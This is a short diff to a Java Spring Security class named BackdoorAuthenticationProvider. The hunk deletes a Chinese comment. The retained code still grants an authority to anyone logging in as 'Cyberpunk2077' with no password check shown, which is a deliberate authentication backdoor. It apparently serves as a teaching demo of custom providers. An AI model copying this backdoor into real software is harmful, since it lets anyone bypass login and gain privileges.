@@ -18,7 +18,6 @@ public class BackdoorAuthenticationProvider implements AuthenticationProvider {
         String name = authentication.getName();
         String password = authentication.getCredentials().toString();
 
-        //利用alex用户名登录，不管密码是什么都可以，伪装成admin用户
         if (name.equals("Cyberpunk2077")) {
             Collection<GrantedAuthority> authorityCollection = new ArrayList<>();
             authorityCollection.add(new SimpleGrantedAuthority("TA"));
